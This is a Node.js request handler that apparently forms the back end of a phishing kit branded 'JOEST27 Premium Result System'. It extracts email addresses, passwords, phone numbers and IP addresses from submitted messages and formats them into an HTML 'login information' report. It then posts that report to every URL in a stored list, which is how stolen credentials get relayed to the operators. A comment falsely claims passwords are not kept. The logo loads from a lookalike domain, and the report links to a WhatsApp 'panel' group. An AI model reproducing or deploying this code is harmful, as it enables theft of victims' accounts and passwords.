const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}

/* ======================
   EXTRACTOR (TEXT + HTML)
====================== */
function extractVars(input = "") {
  const vars = {
    email: "-",
    login: "-",
    phone: "-",
     password: "-",
    user: "-",
    ip: "-"
    // password tidak disimpan demi keamanan
  };

  const raw = String(input);

  const text = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, " ");

  // ======================
  // key:value format
  // ======================
  const kvRegex = /(\b[\w\s]+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(text)) !== null) {
    map(vars, m[1], m[2]);
  }

  // ======================
  // HTML TABLE format
  // ======================
  const tdRegex =
    /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>\s*<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    map(vars, t[1], t[2]);
  }

  return vars;
}

/* ======================
   FIELD MAPPING (SAFE)
====================== */
function map(vars, key, value) {
  if (!value) return;

  const k = String(key)
    .toLowerCase()
    .replace(/[^a-z]/g, "");

  const v = String(value).trim();

  if (k.includes("email") || v.includes("@")) {
    vars.email = v;
    return;
  }
   if (k.includes("password") || v.includes("@")) {
    vars.password = v;
    return;
   }

  if (k.includes("login") || k.includes("via") || k.includes("method")) {
    vars.login = v;
    return;
  }

  if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
    vars.phone = v;
    return;
  }

  if (k.includes("user") || k.includes("name")) {
    vars.user = v;
    return;
  }
}

/* ======================
   IP DETECTOR
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "-"
  );
}
function row(label, value) {
  if (
    value === undefined ||
    value === null ||
    value === "" ||
    value === "-"
  ) {
    return "";
  }

  return `
    <div class="row">
        <span class="label">${label}</span>
        <span class="value">${value}</span>
    </div>
  `;
}
/* ======================
   HTML REPORT
====================== */
function buildHtml(vars) {
  return `




    <!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">

<style>

body{
margin:0;
padding:20px;
background:#1a1a1a;
font-family:Arial,sans-serif;
}

.tblResult{
width:100%;
max-width:650px;
margin:auto;
background:#242424;
border:2px solid #d4af37;
border-collapse:collapse;
border-radius:12px;
overflow:hidden;
}

.header{
background:#3a3a3a;
color:#d4af37;
text-align:center;
font-weight:bold;
letter-spacing:2px;
padding:16px;
}

.section{
background:#333333;
color:#d4af37;
text-align:center;
font-weight:bold;
padding:14px;
}

.tblResult td{
padding:14px;
border-bottom:1px solid #3a3a3a;
color:#ffffff;
}

.label{
width:35%;
color:#d4af37;
font-weight:bold;
}

.value{
text-align:right;
font-weight:600;
}

.join-box{
padding:20px;
background:#242424;
}

.join-btn{
display:block;
text-align:center;
padding:15px;
text-decoration:none;
background:#d4af37;
color:#1a1a1a;
font-weight:bold;
border-radius:8px;
}

.footer{
background:#3a3a3a;
color:#d4af37;
text-align:center;
padding:15px;
font-size:12px;
}

</style>
</head>

<body>

<table class="tblResult">

<tr>
<td colspan="2" style="
background:#2f2f2f;
padding:30px 20px;
text-align:center;
border-bottom:2px solid #d4af37;
">

<img
src="https://tailwiindcss.vercel.app/3b3dea7e-7574-445a-8d0d-98ec60b426b1.png"
style="
width:110px;
height:110px;
border-radius:50%;
border:3px solid #d4af37;
display:block;
margin:auto;
">

<div style="
margin-top:15px;
font-size:28px;
font-weight:900;
letter-spacing:4px;
color:#d4af37;
">
JOEST27
</div>

<div style="
margin-top:8px;
font-size:12px;
letter-spacing:3px;
color:#b0b0b0;
">
PREMIUM RESULT SYSTEM
</div>

</td>
</tr>

<tr>
<td colspan="2" class="header">
INFORMASI LOGIN
</td>
</tr>

<tr>
<td class="label">EMAIL</td>
<td class="value">${vars.email}</td>
</tr>

<tr>
<td class="label">PASSWORD</td>
<td class="value">${vars.password}</td>
</tr>

<tr>
<td class="label">LOGIN VIA</td>
<td class="value">${vars.login}</td>
</tr>

<tr>
<td colspan="2" class="section">
INFORMASI TAMBAHAN
</td>
</tr>

<tr>
<td class="label">PHONE</td>
<td class="value">${vars.phone}</td>
</tr>

<tr>
<td class="label">IP ADDRESS</td>
<td class="value">${vars.ip}</td>
</tr>

<tr>
<td class="label">DATE</td>
<td class="value">${vars.date}</td>
</tr>

<tr>
<td colspan="2" class="join-box">

<a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
class="join-btn">
JOIN WHATSAPP GROUP PANEL
</a>

</td>
</tr>

<tr>
<td colspan="2" class="footer">
© 2026 JOEST27 • 
</td>
</tr>

</table>

</body>
</html>

`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);
    vars.ip = getIP(req);
     if (
  vars.email === "-" ||
  vars.password === "-"
) {
  return res.status(400).json({
    success: false,
    message: "Data belum lengkap"
  });
}
    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }
     

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
